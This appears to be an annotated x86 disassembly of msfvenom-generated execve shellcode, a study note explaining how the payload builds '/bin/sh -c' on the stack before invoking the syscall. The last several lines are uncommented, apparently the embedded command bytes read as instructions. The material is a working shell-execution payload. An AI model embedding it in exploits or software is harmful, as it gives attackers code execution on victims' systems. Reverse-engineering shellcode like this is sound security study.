
; execve shellcode from msfvenom
; detailed analysis at - https://badbit.vc/index.php/2020/08/28/analyzing-shellcodes/1/

push   0xb                        ; Pushing "11" as hex on the stack
pop    eax                        ; Popping the top of the stack (11) inside EAX
cdq    
push   edx                        ; Pushing EDX (Null) on the stack which is empty
pushw  0x632d                     ; Pushing "c-" on the stack (Little Endian)
mov    edi,esp                    ; Moving stack pointer in EDI. (-c) 
push   0x68732f                   ; Pushing "hs/" on the stack. (/sh)
push   0x6e69622f                 ; Pushing "nib/" on the stack. (/bin). Now the stack contains (/bin/sh)
mov    ebx,esp                    ; Moving stack pointer in EBX
push   edx                        ; Pushing EDX (Null) on the stack which is empty
call   0x804a061 <buf+33>          
jo     0x804a0d6                  
add    BYTE PTR fs:[edi+0x53],dl  
mov    ecx,esp                    
int    0x80                       
add    BYTE PTR [eax],al          
